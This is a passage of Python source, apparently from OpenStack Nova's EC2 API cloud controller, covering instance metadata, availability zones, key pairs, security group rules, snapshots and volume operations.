mappings.append(bdm)\n\n    # NOTE(yamahata): trim ebs.no_device == true. Is this necessary?\n    mappings = [bdm for bdm in mappings if not (bdm.get('noDevice', False))]\n\n    if mappings:\n        result['blockDeviceMapping'] = mappings\n\n\nclass CloudController(object):\n    \"\"\" CloudController provides the critical dispatch between\n inbound API calls through the endpoint and messages\n sent to the other nodes.\n\"\"\"\n    def __init__(self):\n        self.image_service = s3.S3ImageService()\n        self.network_api = network.API()\n        self.volume_api = volume.API()\n        self.compute_api = compute.API(\n                network_api=self.network_api,\n                volume_api=self.volume_api)\n        self.setup()\n\n    def __str__(self):\n        return 'CloudController'\n\n    def setup(self):\n        \"\"\" Ensure the keychains and folders exist. \"\"\"\n        # FIXME(ja): this should be moved to a nova-manage command,\n        # if not setup throw exceptions instead of running\n        # Create keys folder, if it doesn't exist\n        if not os.path.exists(FLAGS.keys_path):\n            os.makedirs(FLAGS.keys_path)\n        # Gen root CA, if we don't have one\n        root_ca_path = os.path.join(FLAGS.ca_path, FLAGS.ca_file)\n        if not os.path.exists(root_ca_path):\n            genrootca_sh_path = os.path.join(os.path.dirname(__file__),\n                                             os.path.pardir,\n                                             os.path.pardir,\n                                             'CA',\n                                             'genrootca.sh')\n\n            start = os.getcwd()\n            if not os.path.exists(FLAGS.ca_path):\n                os.makedirs(FLAGS.ca_path)\n            os.chdir(FLAGS.ca_path)\n            # TODO(vish): Do this with M2Crypto instead\n            utils.runthis(_(\"Generating root CA: %s\"), \"sh\", genrootca_sh_path)\n            os.chdir(start)\n\n    def _get_mpi_data(self, context, project_id):\n        result = {}\n        search_opts = {'project_id': project_id}\n        for instance in self.compute_api.get_all(context,\n                search_opts=search_opts):\n            if instance['fixed_ips']:\n                line = '%s slots=%d' % (instance['fixed_ips'][0]['address'],\n                                        instance['vcpus'])\n                key = str(instance['key_name'])\n                if key in result:\n                    result[key].append(line)\n                else:\n                    result[key] = [line]\n        return result\n\n    def _get_availability_zone_by_host(self, context, host):\n        services = db.service_get_all_by_host(context.elevated(), host)\n        if len(services) > 0:\n            return services[0]['availability_zone']\n        return 'unknown zone'\n\n    def _get_image_state(self, image):\n        # NOTE(vish): fallback status if image_state isn't set\n        state = image.get('status')\n        if state == 'active':\n            state = 'available'\n        return image['properties'].get('image_state', state)\n\n    def _format_instance_mapping(self, ctxt, instance_ref):\n        root_device_name = instance_ref['root_device_name']\n        if root_device_name is None:\n            return _DEFAULT_MAPPINGS\n\n        mappings = {}\n        mappings['ami'] = block_device.strip_dev(root_device_name)\n        mappings['root'] = root_device_name\n        default_local_device = instance_ref.get('default_local_device')\n        if default_local_device:\n            mappings['ephemeral0'] = default_local_device\n        default_swap_device = instance_ref.get('default_swap_device')\n        if default_swap_device:\n            mappings['swap'] = default_swap_device\n        ebs_devices = []\n\n        # 'ephemeralN', 'swap' and ebs\n        for bdm in db.block_device_mapping_get_all_by_instance(\n            ctxt, instance_ref['id']):\n            if bdm['no_device']:\n                continue\n\n            # ebs volume case\n            if (bdm['volume_id'] or bdm['snapshot_id']):\n                ebs_devices.append(bdm['device_name'])\n                continue\n\n            virtual_name = bdm['virtual_name']\n            if not virtual_name:\n                continue\n\n            if block_device.is_swap_or_ephemeral(virtual_name):\n                mappings[virtual_name] = bdm['device_name']\n\n        # NOTE(yamahata): I'm not sure how ebs device should be numbered.\n        #                 Right now sort by device name for deterministic\n        #                 result.\n        if ebs_devices:\n            nebs = 0\n            ebs_devices.sort()\n            for ebs in ebs_devices:\n                mappings['ebs%d' % nebs] = ebs\n                nebs += 1\n\n        return mappings\n\n    def get_metadata(self, address):\n        ctxt = context.get_admin_context()\n        search_opts = {'fixed_ip': address}\n        try:\n            instance_ref = self.compute_api.get_all(ctxt,\n                    search_opts=search_opts)\n        except exception.NotFound:\n            instance_ref = None\n        if not instance_ref:\n            return None\n\n        # This ensures that all attributes of the instance\n        # are populated.\n        instance_ref = db.instance_get(ctxt, instance_ref[0]['id'])\n\n        mpi = self._get_mpi_data(ctxt, instance_ref['project_id'])\n        hostname = \"%s.%s\" % (instance_ref['hostname'], FLAGS.dhcp_domain)\n        host = instance_ref['host']\n        availability_zone = self._get_availability_zone_by_host(ctxt, host)\n        floating_ip = db.instance_get_floating_address(ctxt,\n                                                       instance_ref['id'])\n        ec2_id = ec2utils.id_to_ec2_id(instance_ref['id'])\n        image_ec2_id = self.image_ec2_id(instance_ref['image_ref'])\n        security_groups = db.security_group_get_by_instance(ctxt,\n                                                            instance_ref['id'])\n        security_groups = [x['name'] for x in security_groups]\n        mappings = self._format_instance_mapping(ctxt, instance_ref)\n        data = {\n            'user-data': self._format_user_data(instance_ref),\n            'meta-data': {\n                'ami-id': image_ec2_id,\n                'ami-launch-index': instance_ref['launch_index'],\n                'ami-manifest-path': 'FIXME',\n                'block-device-mapping': mappings,\n                'hostname': hostname,\n                'instance-action': 'none',\n                'instance-id': ec2_id,\n                'instance-type': instance_ref['instance_type']['name'],\n                'local-hostname': hostname,\n                'local-ipv4': address,\n                'placement': {'availability-zone': availability_zone},\n                'public-hostname': hostname,\n                'public-ipv4': floating_ip or '',\n                'reservation-id': instance_ref['reservation_id'],\n                'security-groups': security_groups,\n                'mpi': mpi}}\n\n        # public-keys should be in meta-data only if user specified one\n        if instance_ref['key_name']:\n            data['meta-data']['public-keys'] = {\n                '0': {'_name': instance_ref['key_name'],\n                      'openssh-key': instance_ref['key_data']}}\n\n        for image_type in ['kernel', 'ramdisk']:\n            if instance_ref.get('%s_id' % image_type):\n                ec2_id = self.image_ec2_id(instance_ref['%s_id' % image_type],\n                                           self._image_type(image_type))\n                data['meta-data']['%s-id' % image_type] = ec2_id\n\n        if False:  # TODO(vish): store ancestor ids\n            data['ancestor-ami-ids'] = []\n        if False:  # TODO(vish): store product codes\n            data['product-codes'] = []\n        return data\n\n    def describe_availability_zones(self, context, **kwargs):\n        if ('zone_name' in kwargs and\n            'verbose' in kwargs['zone_name'] and\n            context.is_admin):\n            return self._describe_availability_zones_verbose(context,\n                                                             **kwargs)\n        else:\n            return self._describe_availability_zones(context, **kwargs)\n\n    def _describe_availability_zones(self, context, **kwargs):\n        ctxt = context.elevated()\n        enabled_services = db.service_get_all(ctxt, False)\n        disabled_services = db.service_get_all(ctxt, True)\n        available_zones = []\n        for zone in [service.availability_zone for service\n                     in enabled_services]:\n            if not zone in available_zones:\n                available_zones.append(zone)\n        not_available_zones = []\n        for zone in [service.availability_zone for service in disabled_services\n                     if not service['availability_zone'] in available_zones]:\n            if not zone in not_available_zones:\n                not_available_zones.append(zone)\n        result = []\n        for zone in available_zones:\n            result.append({'zoneName': zone,\n                           'zoneState': \"available\"})\n        for zone in not_available_zones:\n            result.append({'zoneName': zone,\n                           'zoneState': \"not available\"})\n        return {'availabilityZoneInfo': result}\n\n    def _describe_availability_zones_verbose(self, context, **kwargs):\n        rv = {'availabilityZoneInfo': [{'zoneName': 'nova',\n                                        'zoneState': 'available'}]}\n\n        services = db.service_get_all(context, False)\n        now = utils.utcnow()\n        hosts = []\n        for host in [service['host'] for service in services]:\n            if not host in hosts:\n                hosts.append(host)\n        for host in hosts:\n            rv['availabilityZoneInfo'].append({'zoneName': '|- %s' % host,\n                                               'zoneState': ''})\n            hsvcs = [service for service in services \\\n                     if service['host'] == host]\n            for svc in hsvcs:\n                delta = now - (svc['updated_at'] or svc['created_at'])\n                alive = (delta.seconds <= FLAGS.service_down_time)\n                art = (alive and \":-)\") or \"XXX\"\n                active = 'enabled'\n                if svc['disabled']:\n                    active = 'disabled'\n                rv['availabilityZoneInfo'].append({\n                        'zoneName': '| |- %s' % svc['binary'],\n                        'zoneState': '%s %s %s' % (active, art,\n                                                   svc['updated_at'])})\n        return rv\n\n    def describe_regions(self, context, region_name=None, **kwargs):\n        if FLAGS.region_list:\n            regions = []\n            for region in FLAGS.region_list:\n                name, _sep, host = region.partition('=')\n                endpoint = '%s://%s:%s%s' % (FLAGS.ec2_scheme,\n                                             host,\n                                             FLAGS.ec2_port,\n                                             FLAGS.ec2_path)\n                regions.append({'regionName': name,\n                                'regionEndpoint': endpoint})\n        else:\n            regions = [{'regionName': 'nova',\n                        'regionEndpoint': '%s://%s:%s%s' % (FLAGS.ec2_scheme,\n                                                            FLAGS.ec2_host,\n                                                            FLAGS.ec2_port,\n                                                            FLAGS.ec2_path)}]\n        return {'regionInfo': regions}\n\n    def describe_snapshots(self,\n                           context,\n                           snapshot_id=None,\n                           owner=None,\n                           restorable_by=None,\n                           **kwargs):\n        if snapshot_id:\n            snapshots = []\n            for ec2_id in snapshot_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                snapshot = self.volume_api.get_snapshot(\n                    context,\n                    snapshot_id=internal_id)\n                snapshots.append(snapshot)\n        else:\n            snapshots = self.volume_api.get_all_snapshots(context)\n        snapshots = [self._format_snapshot(context, s) for s in snapshots]\n        return {'snapshotSet': snapshots}\n\n    def _format_snapshot(self, context, snapshot):\n        s = {}\n        s['snapshotId'] = ec2utils.id_to_ec2_snap_id(snapshot['id'])\n        s['volumeId'] = ec2utils.id_to_ec2_vol_id(snapshot['volume_id'])\n        s['status'] = snapshot['status']\n        s['startTime'] = snapshot['created_at']\n        s['progress'] = snapshot['progress']\n        s['ownerId'] = snapshot['project_id']\n        s['volumeSize'] = snapshot['volume_size']\n        s['description'] = snapshot['display_description']\n\n        s['display_name'] = snapshot['display_name']\n        s['display_description'] = snapshot['display_description']\n        return s\n\n    def create_snapshot(self, context, volume_id, **kwargs):\n        LOG.audit(_(\"Create snapshot of volume %s\"), volume_id,\n                  context=context)\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        snapshot = self.volume_api.create_snapshot(\n                context,\n                volume_id=volume_id,\n                name=kwargs.get('display_name'),\n                description=kwargs.get('display_description'))\n        return self._format_snapshot(context, snapshot)\n\n    def delete_snapshot(self, context, snapshot_id, **kwargs):\n        snapshot_id = ec2utils.ec2_id_to_id(snapshot_id)\n        self.volume_api.delete_snapshot(context, snapshot_id=snapshot_id)\n        return True\n\n    def describe_key_pairs(self, context, key_name=None, **kwargs):\n        key_pairs = db.key_pair_get_all_by_user(context, context.user_id)\n        if not key_name is None:\n            key_pairs = [x for x in key_pairs if x['name'] in key_name]\n\n        result = []\n        for key_pair in key_pairs:\n            # filter out the vpn keys\n            suffix = FLAGS.vpn_key_suffix\n            if context.is_admin or \\\n               not key_pair['name'].endswith(suffix):\n                result.append({\n                    'keyName': key_pair['name'],\n                    'keyFingerprint': key_pair['fingerprint'],\n                })\n\n        return {'keySet': result}\n\n    def create_key_pair(self, context, key_name, **kwargs):\n        LOG.audit(_(\"Create key pair %s\"), key_name, context=context)\n        data = _gen_key(context, context.user_id, key_name)\n        return {'keyName': key_name,\n                'keyFingerprint': data['fingerprint'],\n                'keyMaterial': data['private_key']}\n        # TODO(vish): when context is no longer an object, pass it here\n\n    def import_public_key(self, context, key_name, public_key,\n                         fingerprint=None):\n        LOG.audit(_(\"Import key %s\"), key_name, context=context)\n        key = {}\n        key['user_id'] = context.user_id\n        key['name'] = key_name\n        key['public_key'] = public_key\n        if fingerprint is None:\n            tmpdir = tempfile.mkdtemp()\n            pubfile = os.path.join(tmpdir, 'temp.pub')\n            fh = open(pubfile, 'w')\n            fh.write(public_key)\n            fh.close()\n            (out, err) = utils.execute('ssh-keygen', '-q', '-l', '-f',\n                                       '%s' % (pubfile))\n            fingerprint = out.split(' ')[1]\n            shutil.rmtree(tmpdir)\n        key['fingerprint'] = fingerprint\n        db.key_pair_create(context, key)\n        return True\n\n    def delete_key_pair(self, context, key_name, **kwargs):\n        LOG.audit(_(\"Delete key pair %s\"), key_name, context=context)\n        try:\n            db.key_pair_destroy(context, context.user_id, key_name)\n        except exception.NotFound:\n            # aws returns true even if the key doesn't exist\n            pass\n        return True\n\n    def describe_security_groups(self, context, group_name=None, group_id=None,\n                                 **kwargs):\n        self.compute_api.ensure_default_security_group(context)\n        if group_name or group_id:\n            groups = []\n            if group_name:\n                for name in group_name:\n                    group = db.security_group_get_by_name(context,\n                                                          context.project_id,\n                                                          name)\n                    groups.append(group)\n            if group_id:\n                for gid in group_id:\n                    group = db.security_group_get(context, gid)\n                    groups.append(group)\n        elif context.is_admin:\n            groups = db.security_group_get_all(context)\n        else:\n            groups = db.security_group_get_by_project(context,\n                                                      context.project_id)\n        groups = [self._format_security_group(context, g) for g in groups]\n\n        return {'securityGroupInfo':\n                list(sorted(groups,\n                            key=lambda k: (k['ownerId'], k['groupName'])))}\n\n    def _format_security_group(self, context, group):\n        g = {}\n        g['groupDescription'] = group.description\n        g['groupName'] = group.name\n        g['ownerId'] = group.project_id\n        g['ipPermissions'] = []\n        for rule in group.rules:\n            r = {}\n            r['groups'] = []\n            r['ipRanges'] = []\n            if rule.group_id:\n                source_group = db.security_group_get(context, rule.group_id)\n                r['groups'] += [{'groupName': source_group.name,\n                                 'userId': source_group.project_id}]\n                if rule.protocol:\n                    r['ipProtocol'] = rule.protocol\n                    r['fromPort'] = rule.from_port\n                    r['toPort'] = rule.to_port\n                    g['ipPermissions'] += [dict(r)]\n                else:\n                    for protocol, min_port, max_port in (('icmp', -1, -1),\n                                                         ('tcp', 1, 65535),\n                                                         ('udp', 1, 65536)):\n                        r['ipProtocol'] = protocol\n                        r['fromPort'] = min_port\n                        r['toPort'] = max_port\n                        g['ipPermissions'] += [dict(r)]\n            else:\n                r['ipProtocol'] = rule.protocol\n                r['fromPort'] = rule.from_port\n                r['toPort'] = rule.to_port\n                r['ipRanges'] += [{'cidrIp': rule.cidr}]\n                g['ipPermissions'] += [r]\n        return g\n\n    def _rule_args_to_dict(self, context, kwargs):\n        rules = []\n        if not 'groups' in kwargs and not 'ip_ranges' in kwargs:\n            rule = self._rule_dict_last_step(context, **kwargs)\n            if rule:\n                rules.append(rule)\n            return rules\n        if 'ip_ranges' in kwargs:\n            rules = self._cidr_args_split(kwargs)\n        else:\n            rules = [kwargs]\n        finalset = []\n        for rule in rules:\n            if 'groups' in rule:\n                groups_values = self._groups_args_split(rule)\n                for groups_value in groups_values:\n                    final = self._rule_dict_last_step(context, **groups_value)\n                    finalset.append(final)\n            else:\n                final = self._rule_dict_last_step(context, **rule)\n                finalset.append(final)\n        return finalset\n\n    def _cidr_args_split(self, kwargs):\n        cidr_args_split = []\n        cidrs = kwargs['ip_ranges']\n        for key, cidr in cidrs.iteritems():\n            mykwargs = kwargs.copy()\n            del mykwargs['ip_ranges']\n            mykwargs['cidr_ip'] = cidr['cidr_ip']\n            cidr_args_split.append(mykwargs)\n        return cidr_args_split\n\n    def _groups_args_split(self, kwargs):\n        groups_args_split = []\n        groups = kwargs['groups']\n        for key, group in groups.iteritems():\n            mykwargs = kwargs.copy()\n            del mykwargs['groups']\n            if 'group_name' in group:\n                mykwargs['source_security_group_name'] = group['group_name']\n            if 'user_id' in group:\n                mykwargs['source_security_group_owner_id'] = group['user_id']\n            if 'group_id' in group:\n                mykwargs['source_security_group_id'] = group['group_id']\n            groups_args_split.append(mykwargs)\n        return groups_args_split\n\n    def _rule_dict_last_step(self, context, to_port=None, from_port=None,\n                                  ip_protocol=None, cidr_ip=None, user_id=None,\n                                  source_security_group_name=None,\n                                  source_security_group_owner_id=None):\n\n        values = {}\n\n        if source_security_group_name:\n            source_project_id = self._get_source_project_id(context,\n                source_security_group_owner_id)\n\n            source_security_group = \\\n                    db.security_group_get_by_name(context.elevated(),\n                                                  source_project_id,\n                                                  source_security_group_name)\n            notfound = exception.SecurityGroupNotFound\n            if not source_security_group:\n                raise notfound(security_group_id=source_security_group_name)\n            values['group_id'] = source_security_group['id']\n        elif cidr_ip:\n            # If this fails, it throws an exception. This is what we want.\n            cidr_ip = urllib.unquote(cidr_ip).decode()\n\n            if not utils.is_valid_cidr(cidr_ip):\n                # Raise exception for non-valid address\n                raise exception.InvalidCidr(cidr=cidr_ip)\n\n            values['cidr'] = cidr_ip\n        else:\n            values['cidr'] = '0.0.0.0/0'\n\n        if ip_protocol and from_port and to_port:\n\n            ip_protocol = str(ip_protocol)\n            try:\n                # Verify integer conversions\n                from_port = int(from_port)\n                to_port = int(to_port)\n            except ValueError:\n                if ip_protocol.upper() == 'ICMP':\n                    raise exception.InvalidInput(reason=\"Type and\"\n                         \" Code must be integers for ICMP protocol type\")\n                else:\n                    raise exception.InvalidInput(reason=\"To and From ports \"\n                          \"must be integers\")\n\n            if ip_protocol.upper() not in ['TCP', 'UDP', 'ICMP']:\n                raise exception.InvalidIpProtocol(protocol=ip_protocol)\n\n            # Verify that from_port must always be less than\n            # or equal to to_port\n            if from_port > to_port:\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"Former value cannot\"\n                                            \" be greater than the later\")\n\n            # Verify valid TCP, UDP port ranges\n            if (ip_protocol.upper() in ['TCP', 'UDP'] and\n                (from_port < 1 or to_port > 65535)):\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"Valid TCP ports should\"\n                                           \" be between 1-65535\")\n\n            # Verify ICMP type and code\n            if (ip_protocol.upper() == \"ICMP\" and\n                (from_port < -1 or to_port > 255)):\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"For ICMP, the\"\n                                           \" type:code must be valid\")\n\n            values['protocol'] = ip_protocol\n            values['from_port'] = from_port\n            values['to_port'] = to_port\n        else:\n            # If cidr based filtering, protocol and ports are mandatory\n            if 'cidr' in values:\n                return None\n\n        return values\n\n    def _security_group_rule_exists(self, security_group, values):\n        \"\"\"Indicates whether the specified rule values are already\n           defined in the given security group.\n        \"\"\"\n        for rule in security_group.rules:\n            if 'group_id' in values:\n                if rule['group_id'] == values['group_id']:\n                    return rule['id']\n            else:\n                is_duplicate = True\n                for key in ('cidr', 'from_port', 'to_port', 'protocol'):\n                    if rule[key] != values[key]:\n                        is_duplicate = False\n                        break\n                if is_duplicate:\n                    return rule['id']\n        return False\n\n    def revoke_security_group_ingress(self, context, group_name=None,\n                                      group_id=None, **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        self.compute_api.ensure_default_security_group(context)\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        if group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n\n        msg = \"Revoke security group ingress %s\"\n        LOG.audit(_(msg), security_group['name'], context=context)\n        prevalues = []\n        try:\n            prevalues = kwargs['ip_permissions']\n        except KeyError:\n            prevalues.append(kwargs)\n        rule_id = None\n        for values in prevalues:\n            rulesvalues = self._rule_args_to_dict(context, values)\n            if not rulesvalues:\n                err = \"%s Not enough parameters to build a valid rule\"\n                raise exception.ApiError(_(err % rulesvalues))\n\n            for values_for_rule in rulesvalues:\n                values_for_rule['parent_group_id'] = security_group.id\n                rule_id = self._security_group_rule_exists(security_group,\n                                                           values_for_rule)\n                if rule_id:\n                    db.security_group_rule_destroy(context, rule_id)\n        if rule_id:\n            # NOTE(vish): we removed a rule, so refresh\n            self.compute_api.trigger_security_group_rules_refresh(\n                    context,\n                    security_group_id=security_group['id'])\n            return True\n        raise exception.ApiError(_(\"No rule for the specified parameters.\"))\n\n    # TODO(soren): This has only been tested with Boto as the client.\n    #              Unfortunately, it seems Boto is using an old API\n    #              for these operations, so support for newer API versions\n    #              is sketchy.\n    def authorize_security_group_ingress(self, context, group_name=None,\n                                         group_id=None, **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        self.compute_api.ensure_default_security_group(context)\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        if group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n\n        msg = \"Authorize security group ingress %s\"\n        LOG.audit(_(msg), security_group['name'], context=context)\n        prevalues = []\n        try:\n            prevalues = kwargs['ip_permissions']\n        except KeyError:\n            prevalues.append(kwargs)\n        postvalues = []\n        for values in prevalues:\n            rulesvalues = self._rule_args_to_dict(context, values)\n            if not rulesvalues:\n                err = \"%s Not enough parameters to build a valid rule\"\n                raise exception.ApiError(_(err % rulesvalues))\n            for values_for_rule in rulesvalues:\n                values_for_rule['parent_group_id'] = security_group.id\n                if self._security_group_rule_exists(security_group,\n                                                    values_for_rule):\n                    err = '%s - This rule already exists in group'\n                    raise exception.ApiError(_(err) % values_for_rule)\n                postvalues.append(values_for_rule)\n\n        allowed = quota.allowed_security_group_rules(context,\n                                                   security_group['id'],\n                                                   1)\n        if allowed < 1:\n            msg = _(\"Quota exceeded, too many security group rules.\")\n            raise exception.ApiError(msg)\n\n        for values_for_rule in postvalues:\n            security_group_rule = db.security_group_rule_create(\n                    context,\n                    values_for_rule)\n\n        if postvalues:\n            self.compute_api.trigger_security_group_rules_refresh(\n                    context,\n                    security_group_id=security_group['id'])\n            return True\n\n        raise exception.ApiError(_(\"No rule for the specified parameters.\"))\n\n    def _get_source_project_id(self, context, source_security_group_owner_id):\n        if source_security_group_owner_id:\n        # Parse user:project for source group.\n            source_parts = source_security_group_owner_id.split(':')\n\n            # If no project name specified, assume it's same as user name.\n            # Since we're looking up by project name, the user name is not\n            # used here.  It's only read for EC2 API compatibility.\n            if len(source_parts) == 2:\n                source_project_id = source_parts[1]\n            else:\n                source_project_id = source_parts[0]\n        else:\n            source_project_id = context.project_id\n\n        return source_project_id\n\n    def create_security_group(self, context, group_name, group_description):\n        if not re.match('^[a-zA-Z0-9_\\- ]+$', str(group_name)):\n            # Some validation to ensure that values match API spec.\n            # - Alphanumeric characters, spaces, dashes, and underscores.\n            # TODO(Daviey): LP: #813685 extend beyond group_name checking, and\n            #  probably create a param validator that can be used elsewhere.\n            err = _(\"Value (%s) for parameter GroupName is invalid.\"\n                    \" Content limited to Alphanumeric characters, \"\n                    \"spaces, dashes, and underscores.\") % group_name\n            # err not that of master ec2 implementation, as they fail to raise.\n            raise exception.InvalidParameterValue(err=err)\n\n        if len(str(group_name)) > 255:\n            err = _(\"Value (%s) for parameter GroupName is invalid.\"\n                    \" Length exceeds maximum of 255.\") % group_name\n            raise exception.InvalidParameterValue(err=err)\n\n        LOG.audit(_(\"Create Security Group %s\"), group_name, context=context)\n        self.compute_api.ensure_default_security_group(context)\n        if db.security_group_exists(context, context.project_id, group_name):\n            raise exception.ApiError(_('group %s already exists') % group_name)\n\n        if quota.allowed_security_groups(context, 1) < 1:\n            msg = _(\"Quota exceeded, too many security groups.\")\n            raise exception.ApiError(msg)\n\n        group = {'user_id': context.user_id,\n                 'project_id': context.project_id,\n                 'name': group_name,\n                 'description': group_description}\n        group_ref = db.security_group_create(context, group)\n\n        return {'securityGroupSet': [self._format_security_group(context,\n                                                                 group_ref)]}\n\n    def delete_security_group(self, context, group_name=None, group_id=None,\n                              **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        elif group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n        LOG.audit(_(\"Delete security group %s\"), group_name, context=context)\n        db.security_group_destroy(context, security_group.id)\n        return True\n\n    def get_console_output(self, context, instance_id, **kwargs):\n        LOG.audit(_(\"Get console output for instance %s\"), instance_id,\n                  context=context)\n        # instance_id may be passed in as a list of instances\n        if type(instance_id) == list:\n            ec2_id = instance_id[0]\n        else:\n            ec2_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        output = self.compute_api.get_console_output(\n                context, instance_id=instance_id)\n        now = utils.utcnow()\n        return {\"InstanceId\": ec2_id,\n                \"Timestamp\": now,\n                \"output\": base64.b64encode(output)}\n\n    def get_ajax_console(self, context, instance_id, **kwargs):\n        ec2_id = instance_id[0]\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        return self.compute_api.get_ajax_console(context,\n                                                 instance_id=instance_id)\n\n    def get_vnc_console(self, context, instance_id, **kwargs):\n        \"\"\"Returns vnc browser url.  Used by OS dashboard.\"\"\"\n        ec2_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        return self.compute_api.get_vnc_console(context,\n                                                instance_id=instance_id)\n\n    def describe_volumes(self, context, volume_id=None, **kwargs):\n        if volume_id:\n            volumes = []\n            for ec2_id in volume_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                volume = self.volume_api.get(context, volume_id=internal_id)\n                volumes.append(volume)\n        else:\n            volumes = self.volume_api.get_all(context)\n        volumes = [self._format_volume(context, v) for v in volumes]\n        return {'volumeSet': volumes}\n\n    def _format_volume(self, context, volume):\n        instance_ec2_id = None\n        instance_data = None\n        if volume.get('instance', None):\n            instance_id = volume['instance']['id']\n            instance_ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            instance_data = '%s[%s]' % (instance_ec2_id,\n                                        volume['instance']['host'])\n        v = {}\n        v['volumeId'] = ec2utils.id_to_ec2_vol_id(volume['id'])\n        v['status'] = volume['status']\n        v['size'] = volume['size']\n        v['availabilityZone'] = volume['availability_zone']\n        v['createTime'] = volume['created_at']\n        if context.is_admin:\n            v['status'] = '%s (%s, %s, %s, %s)' % (\n                volume['status'],\n                volume['project_id'],\n                volume['host'],\n                instance_data,\n                volume['mountpoint'])\n        if volume['attach_status'] == 'attached':\n            v['attachmentSet'] = [{'attachTime': volume['attach_time'],\n                                   'deleteOnTermination': False,\n                                   'device': volume['mountpoint'],\n                                   'instanceId': instance_ec2_id,\n                                   'status': 'attached',\n                                   'volumeId': v['volumeId']}]\n        else:\n            v['attachmentSet'] = [{}]\n        if volume.get('snapshot_id') != None:\n            v['snapshotId'] = ec2utils.id_to_ec2_snap_id(volume['snapshot_id'])\n        else:\n            v['snapshotId'] = None\n\n        v['display_name'] = volume['display_name']\n        v['display_description'] = volume['display_description']\n        return v\n\n    def create_volume(self, context, **kwargs):\n        size = kwargs.get('size')\n        if kwargs.get('snapshot_id') != None:\n            snapshot_id = ec2utils.ec2_id_to_id(kwargs['snapshot_id'])\n            LOG.audit(_(\"Create volume from snapshot %s\"), snapshot_id,\n                      context=context)\n        else:\n            snapshot_id = None\n            LOG.audit(_(\"Create volume of %s GB\"), size, context=context)\n\n        volume = self.volume_api.create(\n                context,\n                size=size,\n                snapshot_id=snapshot_id,\n                name=kwargs.get('display_name'),\n                description=kwargs.get('display_description'))\n        # TODO(vish): Instance should be None at db layer instead of\n        #             trying to lazy load, but for now we turn it into\n        #             a dict to avoid an error.\n        return self._format_volume(context, dict(volume))\n\n    def delete_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        self.volume_api.delete(context, volume_id=volume_id)\n        return True\n\n    def update_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        updatable_fields = ['display_name', 'display_description']\n        changes = {}\n        for field in updatable_fields:\n            if field in kwargs:\n                changes[field] = kwargs[field]\n        if changes:\n            self.volume_api.update(context,\n                                   volume_id=volume_id,\n                                   fields=changes)\n        return True\n\n    def attach_volume(self, context, volume_id, instance_id, device, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        instance_id = ec2utils.ec2_id_to_id(instance_id)\n        msg = _(\"Attach volume %(volume_id)s to instance %(instance_id)s\"\n                \" at %(device)s\") % locals()\n        LOG.audit(msg, context=context)\n        self.compute_api.attach_volume(context,\n                                       instance_id=instance_id,\n                                       volume_id=volume_id,\n                                       device=device)\n        volume = self.volume_api.get(context, volume_id=volume_id)\n        return {'attachTime': volume['attach_time'],\n                'device': volume['mountpoint'],\n                'instanceId': ec2utils.id_to_ec2_id(instance_id),\n                'requestId': context.request_id,\n                'status': volume['attach_status'],\n                'volumeId': ec2utils.id_to_ec2_vol_id(volume_id)}\n\n    def detach_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        LOG.audit(_(\"Detach volume %s\"), volume_id, context=context)\n        volume = self.volume_api.get(context, volume_id=volume_id)\n        instance = self.compute_api.detach_volume(context, volume_id=volume_id)\n        return {'attachTime': volume['attach_time'],\n                'device': volume['mountpoint'],\n                'instanceId': ec2utils.id_to_ec2_id(instance['id']),\n                'requestId': context.request_id,\n                'status': volume['attach_status'],\n                'volumeId': ec2utils.id_to_ec2_vol_id(volume_id)}\n\n    def _format_kernel_id(self, instance_ref, result, key):\n        kernel_id = instance_ref['kernel_id']\n        if kernel_id is None:\n            return\n        result[key] = self.image_ec2_id(instance_ref['kernel_id'], 'aki')\n\n    def _format_ramdisk_id(self, instance_ref, result, key):\n        ramdisk_id = instance_ref['ramdisk_id']\n        if ramdisk_id is None:\n            return\n        result[key] = self.image_ec2_id(instance_ref['ramdisk_id'], 'ari')\n\n    @staticmethod\n    def _format_user_data(instance_ref):\n        return base64.b64decode(instance_ref['user_data'])\n\n    def describe_instance_attribute(self, context, instance_id, attribute,\n                                    **kwargs):\n        def _unsupported_attribute(instance, result):\n            raise exception.ApiError(_('attribute not supported: %s') %\n                                     attribute)\n\n        def _format_attr_block_device_mapping(instance, result):\n            tmp = {}\n            self._format_instance_root_device_name(instance, tmp)\n            self._format_instance_bdm(context, instance_id,\n                                      tmp['rootDeviceName'], result)\n\n        def 